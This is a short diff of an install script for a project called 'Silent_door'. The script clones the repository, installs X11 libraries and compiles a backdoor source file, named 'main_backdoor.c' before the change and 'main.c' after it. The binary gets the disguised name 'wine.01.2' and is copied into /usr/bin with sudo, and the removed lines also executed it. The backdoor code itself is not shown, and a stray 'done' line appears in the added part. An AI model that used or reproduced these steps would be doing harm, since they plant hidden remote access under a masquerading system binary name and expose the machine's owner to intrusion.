@@ -1,12 +1,12 @@
-git clone https://github.com/mrx6SO/Silent_door
-cd Silent_door 
+git clone https://github.com/mrx6SO/silent_door
+cd silent_door 
 
 apt install libx11-dev && apt-get update && apt upgrade -y 
-cc main_backdoor.c -o wine.01.2 -lm -w -lX11 
+cc main.c -o wine.01.2 -lm -w -lX11 
+
+sudo cp wine.01.2 -t /usr/bin 
+
+done
 
 
-cp wine.01.2 /usr/bin 
-
-chmod +x wine.01.2 
-./wine.01.2 
 
